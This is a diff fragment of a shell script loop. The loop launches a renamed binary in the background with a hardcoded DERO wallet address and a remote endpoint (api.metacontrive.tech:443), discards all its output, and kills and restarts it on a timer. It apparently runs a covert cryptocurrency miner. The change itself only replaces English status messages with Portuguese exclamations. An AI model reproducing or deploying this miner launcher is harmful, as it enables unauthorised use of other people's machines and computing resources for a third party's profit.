@@ -20,12 +20,11 @@ restart_main() {
     chmod 777 "$new_name"
     ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
     pid=$!
-    echo "Restarted with PID: $pid"
+    echo "VAMOS LA ANDA PA FRENTE PID: $pid"
     sleep "$delay"
-    echo "Stopping process with PID: $pid"
+    echo "PARAR PULA DA CEBA! PID: $pid"
     kill "$pid"
-    echo "Process stopped"
-    echo "Exited process"
+    echo "Feito AGORA SIM!!! SIGA!!!"
   done
 }
 
